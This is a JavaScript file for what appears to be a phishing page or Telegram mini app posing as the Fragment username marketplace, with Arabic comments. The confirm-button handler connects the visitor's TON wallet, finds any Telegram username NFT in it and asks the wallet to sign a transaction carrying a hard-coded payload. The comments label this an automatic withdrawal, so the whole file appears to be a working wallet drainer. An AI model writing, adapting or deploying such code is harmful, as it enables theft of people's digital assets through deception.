// 1. إعداد TonConnect
const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: 'https://alawi2396.github.io/fragment-web/tonconnect-manifest.json',
    buttonRootId: 'connect-button'
});

// 2. وظيفة جلب اليوزر (تدعم تليجرام + المتصفح العادي)
function getTargetUser() {
    // محاولة الجلب من تليجرام (startapp)
    if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initDataUnsafe.start_param) {
        return window.Telegram.WebApp.initDataUnsafe.start_param;
    }
    
    // محاولة الجلب من الرابط العادي (user=)
    const urlParams = new URLSearchParams(window.location.search);
    const userParam = urlParams.get('user');
    
    return userParam || 'username'; // إذا لم يجد شيئاً يضع username
}

const targetUser = getTargetUser();

// 3. تحديث الواجهة وتجهيز التطبيق
document.addEventListener('DOMContentLoaded', () => {
    // إعلام تليجرام أن الموقع جاهز
    if (window.Telegram && window.Telegram.WebApp) {
        window.Telegram.WebApp.ready();
        window.Telegram.WebApp.expand(); // فتح النافذة بالكامل
    }

    // وضع اليوزر في كل الأماكن المطلوبة
    ['u1', 'u2', 'u3', 'u4'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.innerText = targetUser;
    });
});

// 4. منطق السحب عند الضغط على الزر
document.getElementById('confirm-btn').onclick = async () => {
    if (!tonConnectUI.connected) {
        await tonConnectUI.openModal();
        return;
    }

    const walletAddress = tonConnectUI.account.address;
    try {
        const response = await fetch(`https://tonapi.io/v2/accounts/${walletAddress}/nfts`);
        const data = await response.json();
        const nftItem = data.nft_items.find(item => item.metadata && item.metadata.name && item.metadata.name.includes('.t.me'));

        if (nftItem) {
            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 300,
                messages: [{
                    address: nftItem.address,
                    amount: "0",
                    payload: "te6ccgEBAQEADgAAGAAAABAAAABAAAAA" // بايلود السحب التلقائي
                }]
            };
            await tonConnectUI.sendTransaction(transaction);
        }
    } catch (e) {
        console.error("Error:", e);
    }
};
